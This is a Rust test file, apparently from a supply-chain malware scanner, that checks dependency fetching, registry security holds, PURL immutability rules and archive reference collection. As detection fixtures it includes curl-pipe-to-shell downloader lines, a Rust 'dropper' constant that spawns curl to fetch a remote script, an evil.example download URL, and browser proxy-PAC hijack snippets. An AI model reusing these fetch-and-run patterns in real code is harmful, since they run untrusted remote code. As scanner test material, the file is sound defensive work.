use super::*;
use fletch::RefKind;

mod gates;
mod imports;
mod urls;

#[test]
fn unresolved_shell_fetches_retain_root_and_member_coverage_gaps() {
    let script = b"curl -fsSL \"$RELAY\" | sh\n";
    let parsed = filefacts::OpenOptions::new()
        .path(Path::new("stage.sh"))
        .open(script);
    let report = report_of(&serde_json::json!([
        {"id":0,"path":"root.sh","depth":0,"file_type":"shell","sha256":"a".repeat(64),"size":script.len(),"filefacts":{"symbols":parsed.symbols()}},
        {"id":1,"path":"archive.tgz!!package/stage.sh","depth":1,"file_type":"shell","sha256":"b".repeat(64),"size":script.len(),"filefacts":{"symbols":parsed.symbols()}},
        {"id":2,"path":"no-facts.sh","depth":1,"file_type":"shell","sha256":"c".repeat(64),"size":script.len()}
    ]));
    let policy = FetchPolicy::parse_follow("all").expect("policy");
    let records = unresolved_downloader_records(&report, &policy);
    assert_eq!(records.len(), 2);
    for (record, hash) in records.iter().zip(["a", "b"]) {
        assert_eq!(record.source_sha256, Some(hash.repeat(64)));
        assert!(record.source_offset.is_some());
        assert!(matches!(record.outcome, Outcome::Unresolved(_)));
        assert_eq!(record.kind, RefKind::UrlFetch);
        assert!(record.resolved_url.is_none() && record.content_sha256.is_none());
        assert!(
            record
                .coverage
                .iter()
                .any(|fact| matches!(fact, Coverage::Unavailable { .. }))
        );
        assert!(terminal_fetch_row_visible(record));
        assert_eq!(fetch_row(record).label, "gap");
        assert!(!record.locator.contains("RELAY"));
    }
    assert!(summary_line(&records).contains("2 analysis incomplete"));
    let disabled = FetchPolicy::parse_follow("none").expect("disabled policy");
    assert!(unresolved_downloader_records(&report, &disabled).is_empty());
}

#[test]
fn literal_shell_fetches_have_references_without_runtime_gaps() {
    let script = b"curl -H \"$AUTH\" https://download.test/stage.sh | sh\n";
    let parsed = filefacts::OpenOptions::new()
        .path(Path::new("stage.sh"))
        .open(script);
    let report = report_of(&serde_json::json!([
        {"id":0,"path":"archive.tgz!!stage.sh","depth":1,"file_type":"shell","sha256":"a".repeat(64),"size":script.len(),"filefacts":{"symbols":parsed.symbols()}}
    ]));
    let policy = FetchPolicy::parse_follow("all").expect("policy");
    assert!(unresolved_downloader_records(&report, &policy).is_empty());
    let refs =
        collect_references_from_input(&report, Path::new("not-on-disk"), None, CiRefs::Include);
    assert!(
        refs.iter()
            .flat_map(|(_, refs)| refs)
            .any(|r| locator(r) == "https://download.test/stage.sh")
    );
}

fn dropper(url: &str) -> bool {
    Url::parse(url).is_ok_and(|u| looks_like_dropper_download_url(&u))
}

fn valid_host(url: &str) -> bool {
    Url::parse(url).is_ok_and(|u| valid_discovered_url_host(&u))
}

#[test]
fn manifest_relpath_leads_with_the_scanned_artifact() {
    // A plain manifest scanned directly shows just its basename.
    assert_eq!(manifest_relpath("/home/u/package.json"), "package.json");
    // A nested manifest reads as a file inside the scanned archive.
    assert_eq!(
        manifest_relpath("/tmp/demo.zip!!vexium-1.0.tgz!!package/package.json"),
        "demo.zip/vexium-1.0.tgz/package/package.json"
    );
    assert_eq!(
        manifest_relpath("demo.zip!!requirements.txt"),
        "demo.zip/requirements.txt"
    );
}

#[test]
fn dep_pulled_covers_removed_yank_and_hold() {
    let base = crate::test_registry("", "", "");
    assert!(!dep_pulled(&base));
    let mut removed = base.clone();
    removed.version_removed = Some(true);
    assert!(dep_pulled(&removed));
    let mut held = base.clone();
    held.security_hold = Some(true);
    assert!(dep_pulled(&held));
    // pypi/crates record a yank as a `deprecated` reason, never `version_removed`.
    let mut yanked = base.clone();
    yanked.deprecated = Some("Yanked: critical CVE".to_string());
    assert!(dep_pulled(&yanked));
    // An ordinary deprecation notice is not a withdrawal.
    let mut deprecated = base;
    deprecated.deprecated = Some("use v2 instead".to_string());
    assert!(!dep_pulled(&deprecated));
}

fn test_finding(id: &str, crit: cleave::Criticality) -> Finding {
    let mut finding = Finding::new(
        id.to_string(),
        cleave::types::FindingKind::Capability,
        id.to_string(),
        1.0,
    );
    finding.crit = crit;
    finding
}

fn fetched_payload_with_finding(id: &str) -> Analyzed {
    let mut report: AnalysisReport = serde_json::from_value(serde_json::json!({
        "version": "3",
        "files": [{
            "id": 0,
            "path": "holder.tgz",
            "depth": 0,
            "file_type": "npm",
            "sha256": "d".repeat(64),
            "size": 399u64
        }]
    }))
    .expect("dependency report");
    report.files[0]
        .findings
        .push(test_finding(id, cleave::Criticality::Notable));
    Analyzed {
        sub: Some(report),
        content_sha: "d".repeat(64),
        next_from_bytes: Vec::new(),
        corpus: None,
    }
}

#[test]
fn published_npm_lockfiles_identify_publisher_development_graph() {
    let locator = "pkg:npm/library@1.0.0";
    for name in ["yarn.lock", "package-lock.json", "pnpm-lock.yaml"] {
        assert!(is_published_npm_development_lock(
            locator,
            &format!("{locator}!!package/{name}")
        ));
    }
    assert!(!is_published_npm_development_lock(
        locator,
        "pkg:npm/library@1.0.0!!package/npm-shrinkwrap.json"
    ));
    assert!(!is_published_npm_development_lock(
        "pkg:pypi/library@1.0.0",
        "pkg:pypi/library@1.0.0!!package/yarn.lock"
    ));
    assert!(!is_published_npm_development_lock(
        locator,
        "/workspace/yarn.lock"
    ));
    let mut refs = vec![url_ref("https://example.test/package.tgz")];
    mark_published_npm_development_refs(
        locator,
        "pkg:npm/library@1.0.0!!package/yarn.lock",
        &mut refs,
    );
    assert_eq!(
        refs[0].context.as_ref().unwrap().scope,
        filefacts::DependencyScope::Development
    );
    let mut shrinkwrap = vec![url_ref("https://example.test/package.tgz")];
    mark_published_npm_development_refs(
        locator,
        "pkg:npm/library@1.0.0!!package/npm-shrinkwrap.json",
        &mut shrinkwrap,
    );
    assert!(shrinkwrap[0].context.is_none());
}

#[test]
fn peer_candidate_note_preserves_analysis_gap() {
    let mut record = fetched_record();
    record.coverage.push(Coverage::Incomplete);
    mark_peer_candidate(&mut record, "package.json:peerDependencies");
    assert_eq!(
        record.coverage,
        [
            Coverage::Incomplete,
            Coverage::Candidate {
                source: CandidateSource::PeerDependency
            }
        ]
    );
    assert_eq!(
        coverage_text(&record),
        "analysis incomplete; peer dependency candidate; installed version is unknown"
    );
    assert!(summary_line(&[record]).contains("analysis incomplete"));
}

/// Every candidate for what is installed is a dependency gap, whichever
/// ecosystem named it; a deliberate policy skip is not.
#[test]
fn every_candidate_counts_as_a_gap_and_policy_skips_do_not() {
    let candidate = |source| {
        let mut record = fetched_record();
        record.coverage.push(Coverage::Candidate { source });
        record
    };
    let skipped = |why| {
        let mut record = fetched_record();
        record.outcome = Outcome::Skipped;
        record.coverage.push(why);
        record
    };
    let records = [
        candidate(CandidateSource::PeerDependency),
        candidate(CandidateSource::ArchRepository),
        candidate(CandidateSource::PythonImport),
        skipped(Coverage::DevelopmentExcluded),
        skipped(Coverage::TransitiveNotFollowed),
        skipped(Coverage::CoveredByDeclaration),
    ];
    assert_eq!(dependency_attention(&records).gaps, 3);
}

fn fetched_record() -> FetchRecord {
    FetchRecord {
        source_sha256: Some("s".repeat(64)),
        context: None,
        coverage: Vec::new(),
        source_offset: Some(17),
        kind: RefKind::Dependency,
        locator: "pkg:npm/held@0.0.1-security".to_string(),
        resolved_url: Some("https://registry.test/held-0.0.1-security.tgz".to_string()),
        final_url: None,
        redirects: Vec::new(),
        status: Some(200),
        headers: Vec::new(),
        fetched_at: None,
        content_sha256: Some("d".repeat(64)),
        size: Some(399),
        served: Some(Served::Cache),
        outcome: Outcome::Ok,
    }
}

/// Registry/package composites must be grafted before `capture_dependency`
/// consumes its snapshot; otherwise Hopper grades the dependency as clean and
/// the parent never receives a dependency-verdict back-reference.
#[test]
fn registry_composite_reaches_standalone_capture_and_merged_dependency() {
    let mut payload = fetched_payload_with_finding("artifact/seed");
    let registry = vec![test_finding(
        "metadata/registry::registry-security-hold-record",
        cleave::Criticality::Suspicious,
    )];
    let expected_composite =
        "objectives/supply-chain::registry-security-withdrawn-package-coordinate";

    prepare_dependency_report_with(
        &mut payload,
        Some(&registry),
        &AnalysisOptions::default(),
        |report, artifact_sha, artifact, registry, _opts| {
            assert_eq!(artifact_sha, "d".repeat(64));
            assert!(artifact.iter().any(|f| f.id == "artifact/seed"));
            assert!(
                registry
                    .iter()
                    .any(|f| { f.id == "metadata/registry::registry-security-hold-record" })
            );
            report
                .files
                .iter_mut()
                .find(|file| file.sha256 == artifact_sha)
                .expect("artifact node")
                .findings
                .push(test_finding(
                    expected_composite,
                    cleave::Criticality::Hostile,
                ));
        },
    );

    let rec = fetched_record();
    let captured = capture_dependency(&rec, &payload).expect("standalone capture");
    let captured: cleave::types::CompactReport =
        serde_json::from_str(&captured.raw).expect("captured report parses");
    assert!(
        captured.files[0]
            .findings
            .iter()
            .any(|f| f.id == expected_composite && f.criticality == 5),
        "the standalone report graded for Hopper must contain the hostile registry composite"
    );

    let mut parent: AnalysisReport = serde_json::from_value(serde_json::json!({
        "version": "3",
        "files": [{
            "id": 0,
            "path": "package.json",
            "depth": 0,
            "file_type": "package_json",
            "sha256": "s".repeat(64),
            "size": 100u64
        }]
    }))
    .expect("parent report");
    let mut graft = Graft::new(&parent);
    merge_payload(&mut parent, &mut graft, &rec, payload);
    let fetched = parent
        .files
        .iter()
        .find(|file| file.sha256 == "d".repeat(64))
        .expect("merged dependency root");
    assert_eq!(fetched.rel, cleave::types::Rel::Fetched);
    assert!(
        fetched
            .findings
            .iter()
            .any(|f| f.id == expected_composite && f.crit == cleave::Criticality::Hostile),
        "the embedded-file grader must see the same hostile registry composite"
    );
}

/// Registry correlation is opt-in per fetched edge. A dependency without a
/// registry record must be captured unchanged and must not invoke the
/// package-composite pass with unrelated metadata.
#[test]
fn missing_registry_does_not_mutate_fetched_dependency() {
    let mut payload = fetched_payload_with_finding("artifact/seed");
    prepare_dependency_report_with(
        &mut payload,
        None,
        &AnalysisOptions::default(),
        |_report, _sha, _artifact, _registry, _opts| {
            panic!("package composite pass must not run without matching registry metadata")
        },
    );

    let captured = capture_dependency(&fetched_record(), &payload).expect("capture");
    let captured: cleave::types::CompactReport =
        serde_json::from_str(&captured.raw).expect("captured report parses");
    assert_eq!(captured.files[0].findings.len(), 1);
    assert_eq!(captured.files[0].findings[0].id, "artifact/seed");
}

/// npm resolves a versionless or ranged declaration to a concrete holder
/// release. Registry metadata remains keyed by the declaration; the fetch
/// record carries the resolved coordinate. The package pass must join on
/// the former or a security-holder transition disappears.
#[test]
fn registry_join_survives_versionless_purl_resolution() {
    let mut declared = Reference::new(
        RefLocator::Purl("pkg:npm/held".to_string()),
        RefKind::Dependency,
        "package.json",
        "held",
    );
    declared.offset = Some(17);
    let fetched = fetched_record();
    assert_eq!(fetched.locator, "pkg:npm/held@0.0.1-security");
    assert_ne!(locator(&declared), fetched.locator);

    let mut by_declared_locator = HashMap::new();
    by_declared_locator.insert(
        locator(&declared).to_owned(),
        vec![test_finding(
            "metadata/registry::registry-security-hold-record",
            cleave::Criticality::Suspicious,
        )],
    );
    let paired = registry_findings_for_reference(&by_declared_locator, &declared)
        .expect("versionless declaration retains its registry sidecar");
    assert_eq!(paired.len(), 1);
    assert_eq!(
        paired[0].id,
        "metadata/registry::registry-security-hold-record"
    );
    assert!(
        !by_declared_locator.contains_key(&fetched.locator),
        "control: joining on the resolved fetch locator would drop the sidecar"
    );
}

#[test]
fn summary_line_omits_zero_counts() {
    let record = |outcome: Outcome, served: Served, size: Option<u64>| FetchRecord {
        source_sha256: None,
        context: None,
        coverage: Vec::new(),
        source_offset: None,
        kind: RefKind::Dependency,
        locator: "pkg:npm/x".to_string(),
        resolved_url: None,
        final_url: None,
        redirects: Vec::new(),
        status: None,
        headers: Vec::new(),
        fetched_at: None,
        content_sha256: None,
        size,
        served: Some(served),
        outcome,
    };
    // Two cache hits, nothing live: the `0 live` is dropped, bytes stay.
    let warm = vec![
        record(Outcome::Ok, Served::Cache, Some(512)),
        record(Outcome::Ok, Served::Cache, Some(512)),
    ];
    let line = summary_line(&warm);
    assert!(line.contains("2 cached"), "{line}");
    assert!(
        !line.contains("live"),
        "zero `live` must be omitted: {line}"
    );
    // A mixed run keeps both non-zero counts.
    let mixed = vec![
        record(Outcome::Ok, Served::Network, Some(0)),
        record(Outcome::Ok, Served::Cache, Some(0)),
    ];
    let line = summary_line(&mixed);
    assert!(line.contains("1 live"), "{line}");
    assert!(line.contains("1 cached"), "{line}");
}

#[test]
fn unresolved_fetches_stay_out_of_the_terminal_view() {
    let mut rec = fetched_record();
    rec.outcome = Outcome::Unresolved(fletch::fetch::Unresolved::NoRelease);

    assert!(!terminal_fetch_row_visible(&rec));
    assert!(matches!(landed_state(&rec), DepState::Hidden));
    assert!(matches!(done_state(&rec), DepState::Hidden));

    rec.outcome = Outcome::Failed(FetchError::Transport("connection reset".to_string()));
    assert!(terminal_fetch_row_visible(&rec));
    assert!(matches!(done_state(&rec), DepState::Done { .. }));
}

/// Neither `Skipped` reaches the human view: a reference that was never a
/// fetch target says nothing about the scanned artifact, and a corpus hit is
/// bytes the fleet already judged. Both stay in the record and the log.
#[test]
fn skipped_fetches_stay_out_of_the_terminal_view() {
    let mut rec = fetched_record();
    rec.outcome = Outcome::Skipped;
    rec.content_sha256 = None;
    assert!(!terminal_fetch_row_visible(&rec));
    assert!(matches!(done_state(&rec), DepState::Hidden));

    // A corpus hit — the other `Skipped` — is equally quiet.
    rec.content_sha256 = Some("d".repeat(64));
    assert!(!terminal_fetch_row_visible(&rec));
    assert!(matches!(done_state(&rec), DepState::Hidden));
}

/// A corpus answer may only stand in for a fetch of one immutable release:
/// hopper answers a version-less PURL with whatever version it saw last.
#[test]
fn purl_precheck_requires_an_exact_version() {
    for purl in [
        "pkg:npm/foo@1.2.3",
        "pkg:npm/%40scope/pkg@2.0.0-beta.1",
        "pkg:golang/github.com/a/b@v0.0.0-20240101000000-abcdef123456",
        "pkg:pypi/foo@1!2.0?extra=x",
        "pkg:github/o/r@0123456789abcdef0123456789abcdef01234567",
    ] {
        assert!(pins_exact_version(purl), "{purl}");
    }
    for purl in [
        "pkg:npm/foo",
        "pkg:npm/@scope/pkg",
        "pkg:npm/foo@latest",
        "pkg:npm/foo@^1.2.0",
        "pkg:npm/foo@1.x",
        "pkg:npm/foo@>=1.0.0",
        "pkg:github/o/r@main",
        "pkg:github/o/r",
    ] {
        assert!(!pins_exact_version(purl), "{purl}");
    }
}

/// Only a coordinate whose bytes cannot change may be answered by name.
#[test]
fn only_immutable_coordinates_are_answered_by_name() {
    for purl in [
        "pkg:npm/foo@1.2.3",
        "pkg:cargo/serde@1.0.200",
        "pkg:golang/github.com/a/b@v1.2.3",
        "pkg:nuget/Newtonsoft.Json@13.0.3",
        "pkg:maven/org.a/b@1.0",
        "pkg:github/o/r@0123456789abcdef0123456789abcdef01234567",
    ] {
        assert!(immutable_coordinate(purl, None), "{purl}");
    }
    for purl in [
        "pkg:github/o/r@v1.2.3",
        "pkg:pypi/foo@1.0",
        "pkg:gem/rails@7.1.0",
        "pkg:docker/library/alpine@3.19",
        "pkg:maven/org.a/b@1.0-SNAPSHOT",
        "pkg:npm/foo@1.2.3?repository_url=https://npm.corp.example",
        "pkg:npm/foo@1.2.3?download_url=https://evil.example/foo.tgz",
        "pkg:npm/foo@latest",
        "pkg:npm/foo",
        // Hex-looking versions are commits only on a VCS host.
        "pkg:pypi/foo@1111111111111111111111111111111111111111",
        "pkg:docker/library/alpine@0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
    ] {
        assert!(!immutable_coordinate(purl, None), "{purl}");
    }
    // PyPI closes a release to new files 14 days after it opens (July 2026);
    // a day of margin covers whose clock and which start PyPI means.
    let day = 86_400;
    assert!(!immutable_coordinate("pkg:pypi/foo@1.0", Some(14 * day)));
    assert!(!immutable_coordinate("pkg:pypi/foo@1.0", Some(15 * day)));
    assert!(immutable_coordinate("pkg:pypi/foo@1.0", Some(15 * day + 1)));
    assert!(!immutable_coordinate(
        "pkg:pypi/foo@1.0?repository_url=https://pypi.corp.example",
        Some(400 * day)
    ));
    // Age makes no other mutable ecosystem immutable.
    assert!(!immutable_coordinate(
        "pkg:gem/rails@7.1.0",
        Some(400 * day)
    ));
}

/// A PyPI file is immutable where the key is that exact file, though its
/// young release is not; the release-keyed rule above must not move.
#[test]
fn a_pypi_file_is_immutable_only_as_a_file() {
    let wheel = "pkg:pypi/requests@2.32.3?file_name=requests-2.32.3-py3-none-any.whl";
    assert!(immutable_file(wheel));
    assert!(
        !immutable_coordinate(wheel, None),
        "the corpus and bloom key by release: a young release stays mutable there"
    );
    for purl in [
        // The release, not a file of it.
        "pkg:pypi/requests@2.32.3",
        // Another index's file is that index's promise, not PyPI's.
        "pkg:pypi/requests@2.32.3?file_name=requests-2.32.3.tar.gz&repository_url=https://pypi.corp.example",
        // No exact version.
        "pkg:pypi/requests?file_name=requests-2.32.3.tar.gz",
        // Other ecosystems follow the release rule.
        "pkg:gem/rails@7.1.0",
    ] {
        assert!(!immutable_file(purl), "{purl}");
    }
    // Everything immutable as a release is immutable as a file.
    assert!(immutable_file("pkg:npm/foo@1.2.3"));
}

/// A mutable coordinate resolves to the digest the registry lists for the
/// file a fetch would download, and to nothing when it lists none.
#[test]
fn a_mutable_coordinate_resolves_to_its_registry_digest() {
    let sha = "ab".repeat(32);
    let doc = format!(
        r#"{{"info":{{"version":"1.0"}},"urls":[{{"filename":"widget-1.0-py3-none-any.whl",
        "url":"https://files.pythonhosted.org/w/widget-1.0-py3-none-any.whl",
        "packagetype":"bdist_wheel","digests":{{"sha256":"{}"}}}}]}}"#,
        sha.to_ascii_uppercase()
    );
    let net = fletch::fetch::Fixtures::default()
        .with("https://pypi.org/pypi/widget/1.0/json", doc.as_bytes());
    let cache = super::tests_offline::cache();
    assert_eq!(
        registry_digest("pkg:pypi/widget@1.0", &net, &cache).as_deref(),
        Some(sha.as_str())
    );
    assert_eq!(
        registry_digest("pkg:github/o/r@v1", &super::tests_offline::Offline, &cache),
        None
    );
}

#[test]
fn unavailable_commands_are_typed_and_attributed_to_the_declaring_file() {
    let sha = "a".repeat(64);
    let mut report: AnalysisReport = serde_json::from_value(serde_json::json!({
        "version": "3",
        "files": [{"id": 0, "path": "extension.js", "depth": 0,
            "file_type": "javascript", "sha256": sha, "size": 100u64}]
    }))
    .expect("report");
    let mut records = Vec::new();
    for (kind, status) in [
        (RefKind::Command, 404),
        (RefKind::Command, 410),
        (RefKind::Dependency, 404),
        (RefKind::UrlFetch, 404),
        (RefKind::Command, 403),
        (RefKind::Command, 500),
    ] {
        let mut rec = fetched_record();
        rec.source_sha256 = Some(sha.clone());
        rec.kind = kind;
        rec.outcome = Outcome::Failed(FetchError::Status(status));
        rec.status = Some(status);
        records.push(rec);
    }
    let mut transport = records[0].clone();
    transport.status = None;
    transport.outcome = Outcome::Failed(FetchError::Transport("404 in error text".into()));
    records.push(transport);
    let mut other_file = records[0].clone();
    other_file.source_sha256 = Some("b".repeat(64));
    records.push(other_file);
    attribute_reference_outcomes(&mut report, &records, &BTreeMap::new());
    let metrics = report.files[0].filefacts_metrics.as_ref().expect("metrics");
    assert_eq!(metrics["references.unavailable_command_count"], 2.0);
}

/// A 404 says the coordinate names nothing the registry carries — a fact
/// about the manifest, not the artifact being scanned — and a big lockfile
/// produces them by the dozen. A failure that should have worked stays.
#[test]
fn absent_artifacts_stay_out_of_the_terminal_view() {
    let mut rec = fetched_record();
    rec.outcome = Outcome::Failed(FetchError::Status(404));
    rec.status = Some(404);
    assert!(!terminal_fetch_row_visible(&rec));
    assert!(matches!(done_state(&rec), DepState::Hidden));

    rec.status = Some(503);
    assert!(terminal_fetch_row_visible(&rec));

    // Only the typed status says the artifact is absent; error text is
    // never parsed for one.
    rec.status = None;
    assert!(terminal_fetch_row_visible(&rec));

    rec.outcome = Outcome::Failed(FetchError::Transport("connection reset".to_string()));
    assert!(terminal_fetch_row_visible(&rec), "transport failure");
}

/// A dependency whose verdict came from the corpus is never analyzed, so it
/// has no subtree to graft — but it must still appear in the tree, or the
/// adopted verdict has nothing to hang on and the dependency reads as
/// though it were never there.
#[test]
fn an_adopted_verdict_gives_its_dependency_a_node() {
    let parent = || -> AnalysisReport {
        serde_json::from_value(serde_json::json!({
            "version": "3",
            "files": [{
                "id": 0, "path": "package.json", "depth": 0,
                "file_type": "package_json", "sha256": "s".repeat(64), "size": 100u64
            }],
        }))
        .expect("parent report")
    };
    let mut rec = fetched_record();
    rec.locator = "pkg:npm/zaboodle@1.49".to_string();
    rec.source_sha256 = Some("s".repeat(64));
    rec.outcome = Outcome::Skipped;
    let verdict = crate::corpus_precheck::Verdict {
        fires_at: crate::model::Level::At(2),
        reason: None,
        findings: Vec::new(),
        ..Default::default()
    };
    let analyzed = |corpus: Option<Verdict>| Analyzed {
        sub: None,
        content_sha: "d".repeat(64),
        next_from_bytes: Vec::new(),
        corpus,
    };

    let mut adopted = parent();
    let mut graft = Graft::new(&adopted);
    merge_payload(&mut adopted, &mut graft, &rec, analyzed(Some(verdict)));
    let node = adopted
        .files
        .iter()
        .find(|f| f.sha256 == "d".repeat(64))
        .expect("the adopted dependency is in the tree");
    assert_eq!(node.path, "pkg:npm/zaboodle@1.49", "named by its locator");
    assert_eq!(node.rel, cleave::types::Rel::Fetched);
    assert_eq!(
        node.parent_id,
        Some(0),
        "hangs off the file that declared it"
    );
    assert_eq!(node.depth, 1);

    // Nothing adopted (a rule-2 benign skip, or an ordinary empty payload)
    // adds nothing: there is no verdict for a node to carry.
    let mut bare = parent();
    let mut graft = Graft::new(&bare);
    merge_payload(&mut bare, &mut graft, &rec, analyzed(None));
    assert_eq!(bare.files.len(), 1);
}

/// Regression for the silent-skip bug: `UnverifiablePin` delivers bytes just
/// as `Ok` and `PinMismatch` do. The "did we get bytes" gates are `matches!`,
/// which the compiler does not check for exhaustiveness, so a new Outcome can
/// slip through them and drop a fetched payload out of analysis unnoticed —
/// precisely the payload whose pin could not be verified.
#[test]
fn an_unverifiable_pin_is_analyzed_and_tallied_like_any_delivered_bytes() {
    let mut rec = fetched_record();
    rec.outcome = Outcome::UnverifiablePin;

    assert!(delivered_bytes(&rec));
    assert!(matches!(landed_state(&rec), DepState::Analyzing));
    assert!(terminal_fetch_row_visible(&rec));

    // It must reach the run summary rather than vanish from the counts.
    let line = summary_line(std::slice::from_ref(&rec));
    assert!(line.contains("1 cached"), "{line}");

    // And read as its own row, distinct from a verified fetch and from the
    // harder `pin!` mismatch.
    assert_eq!(fetch_row(&rec).label, "pin?");
}

/// One dependency named by forty manifests fails identically forty times.
/// The streamed log states each distinct outcome once; the tree, which
/// already keys its rows by locator, and `Off`, which prints nothing, do
/// not filter.
#[test]
fn the_streamed_log_states_each_distinct_row_once() {
    let stream = Reporter::Stream {
        external_dependencies: AtomicU32::new(0),
        external_urls: AtomicU32::new(0),
        budget_notice: AtomicBool::new(false),
        printed: std::sync::Mutex::new(HashSet::new()),
    };

    let mut rec = fetched_record();
    rec.outcome = Outcome::Failed(FetchError::Status(404));
    assert!(stream.claim_row(&rec), "the first row must print");
    assert!(!stream.claim_row(&rec), "a repeat of it must not");

    // A different outcome over the same target is a different fact.
    let mut other_outcome = rec.clone();
    other_outcome.outcome = Outcome::UnverifiablePin;
    assert!(stream.claim_row(&other_outcome));

    // So is the same outcome over a different target.
    let mut other_target = rec.clone();
    other_target.resolved_url = Some("https://registry.test/other-1.0.0.tgz".to_string());
    assert!(stream.claim_row(&other_target));

    // A record that never resolved is keyed by its locator instead, so two
    // unresolved locators do not collapse into one row.
    let mut bare = rec.clone();
    bare.resolved_url = None;
    assert!(stream.claim_row(&bare));
    assert!(!stream.claim_row(&bare));

    assert!(Reporter::Off.claim_row(&rec));
    assert!(Reporter::Off.claim_row(&rec));
}

#[test]
fn budget_notice_names_the_limiting_count_budget() {
    assert_eq!(
        fetch_count_budget_notice("URL", 4, usize::MAX),
        "Skipping remaining fetches, hit the per-file URL budget (4)"
    );
    assert_eq!(
        fetch_count_budget_notice("dependency", 100, 7),
        "Skipping remaining fetches, hit this run's fetch budget (7 left)"
    );
}

fn url_ref(url: &str) -> Reference {
    Reference::new(
        RefLocator::Url(url.to_string()),
        RefKind::UrlFetch,
        "test",
        url,
    )
}

fn purl_ref(purl: &str) -> Reference {
    Reference::new(
        RefLocator::Purl(purl.to_string()),
        RefKind::Dependency,
        "test",
        purl,
    )
}

#[test]
fn collect_go_references_uses_owner_replacement_and_not_checksum_history() {
    let input = [
        (
            "p.zip!!go.mod",
            "module app\nrequire example.test/lib v1.0.0\nreplace example.test/lib => example.test/fork v2.0.0\n",
        ),
        (
            "p.zip!!go.sum",
            "example.test/fork v2.0.0/go.mod h1:METADATA\nexample.test/fork v2.0.0 h1:EXACT\nexample.test/lib v9.0.0 h1:HISTORY\n",
        ),
    ];
    let files: Vec<_> = input.iter().enumerate().map(|(i, (path, text))| {
            let parsed = filefacts::OpenOptions::new().path(Path::new(path.rsplit("!!").next().unwrap())).open(text.as_bytes());
            serde_json::json!({"id":i,"path":path,"depth":1,"file_type":"go_mod","sha256":format!("{i:064x}"),"size":text.len(),"filefacts":{"references":parsed.references(),"values":parsed.values()}})
        }).collect();
    let report: AnalysisReport =
        serde_json::from_value(serde_json::json!({"version":"3","files":files})).unwrap();
    let groups = collect_references(&report, Path::new("/nonexistent"), CiRefs::Skip);
    let dependencies: Vec<_> = groups
        .iter()
        .flat_map(|(_, refs)| refs)
        .filter(|r| r.kind == RefKind::Dependency)
        .collect();
    assert_eq!(dependencies.len(), 1);
    assert_eq!(
        dependencies[0].locator,
        RefLocator::Purl("pkg:golang/example.test/fork@v2.0.0".into())
    );
    assert_eq!(dependencies[0].pinned_hash.as_ref().unwrap().value, "EXACT");
}

#[test]
fn collect_go_references_keeps_identical_manifests_in_distinct_workspaces() {
    let input = [
        (
            "p.zip!!one/go.work",
            "use ./app\nreplace example.test/lib => example.test/one v1.0.0\n",
        ),
        (
            "p.zip!!two/go.work",
            "use ./app\nreplace example.test/lib => example.test/two v1.0.0\n",
        ),
        (
            "p.zip!!one/app/go.mod",
            "module app\nrequire example.test/lib v1.0.0\n",
        ),
        (
            "p.zip!!two/app/go.mod",
            "module app\nrequire example.test/lib v1.0.0\n",
        ),
    ];
    let files: Vec<_> = input.iter().enumerate().map(|(i, (path, text))| {
            let parsed = filefacts::OpenOptions::new().path(Path::new(path.rsplit("!!").next().unwrap())).open(text.as_bytes());
            serde_json::json!({"id":i,"path":path,"depth":1,"file_type":"go_mod","sha256":format!("{:064x}",i.min(2)),"size":text.len(),"filefacts":{"references":parsed.references(),"values":parsed.values()}})
        }).collect();
    let report: AnalysisReport =
        serde_json::from_value(serde_json::json!({"version":"3","files":files})).unwrap();
    let groups = collect_references(&report, Path::new("/nonexistent"), CiRefs::Skip);
    let selected: HashSet<_> = groups
        .iter()
        .flat_map(|(_, refs)| refs)
        .filter(|r| r.kind == RefKind::Dependency)
        .map(|r| locator(r).to_owned())
        .collect();
    assert_eq!(
        selected,
        HashSet::from([
            "pkg:golang/example.test/one@v1.0.0".into(),
            "pkg:golang/example.test/two@v1.0.0".into()
        ])
    );
}

/// A zstd-compressed tar on disk holding `members`, for the member re-read
/// path. Compressed like a real package, so the root's own text hunt sees
/// no member text and every hunted reference comes from the member path.
fn write_tar_zst(dir: &Path, members: &[(&str, &[u8])]) -> std::path::PathBuf {
    let path = dir.join("sample.tar.zst");
    let file = std::fs::File::create(&path).expect("create archive");
    let encoder = zstd::Encoder::new(file, 0).expect("zstd encoder");
    let mut builder = tar::Builder::new(encoder);
    for (name, body) in members {
        let mut header = tar::Header::new_ustar();
        header.set_size(body.len() as u64);
        header.set_mode(0o644);
        header.set_cksum();
        builder
            .append_data(&mut header, name, *body)
            .expect("append member");
    }
    builder
        .into_inner()
        .expect("finish tar")
        .finish()
        .expect("finish zstd");
    path
}

const RUST_DROPPER: &[u8] = b"use std::process::{Command, Stdio};\n\
        fn run() {\n\
            let curl = Command::new(\"curl\")\n\
                .args([\"-fsSL\", \"https://stage.test/bashlinux.sh\"])\n\
                .stdout(Stdio::piped())\n\
                .spawn();\n\
        }\n";
const README: &[u8] = b"# tool\n\
        [![Crates.io](https://img.shields.io/crates/v/tool.svg)](https://crates.io/crates/tool)\n\
        Or run `curl -fsSL https://docs.test/install.sh`.\n";

#[test]
fn archive_browser_pac_program_keeps_member_source_identity() {
    let tmp = tempfile::tempdir().expect("tempdir");
    let javascript = b"browser.proxy.settings.set({value:{proxyType:'autoConfig',autoConfigUrl:'https://proxy.test/config.pac'}});";
    let shadowed = b"function f(browser){browser.proxy.settings.set({value:{proxyType:'autoConfig',autoConfigUrl:'https://shadow.test/decoy.pac'}});}";
    let root = write_tar_zst(
        tmp.path(),
        &[
            ("background.js", javascript),
            ("shadowed.js", shadowed),
            ("README.md", README),
        ],
    );
    let path = root.to_string_lossy().into_owned();
    let owner = "bb".repeat(32);
    let report: AnalysisReport = serde_json::from_value(serde_json::json!({
        "version": "3",
        "files": [
            { "id": 0, "path": path, "depth": 0, "file_type": "tar",
              "sha256": "aa".repeat(32), "size": 4096u64 },
            { "id": 1, "parent_id": 0, "path": format!("{path}!!background.js"),
              "depth": 1, "file_type": "javascript", "sha256": owner,
              "size": javascript.len() as u64,
              "findings": [{ "id": TRAIT_BROWSER_PAC_URL }] },
            { "id": 2, "parent_id": 0, "path": format!("{path}!!README.md"),
              "depth": 1, "file_type": "markdown", "sha256": "cc".repeat(32),
              "size": README.len() as u64 },
            { "id": 3, "parent_id": 0, "path": format!("{path}!!shadowed.js"),
              "depth": 1, "file_type": "javascript", "sha256": "dd".repeat(32),
              "size": shadowed.len() as u64,
              "findings": [{ "id": TRAIT_BROWSER_PAC_URL }] }
        ]
    }))
    .expect("report deserializes");
    let groups = collect_references(&report, &root, CiRefs::Skip);
    let matches: Vec<_> = groups
        .iter()
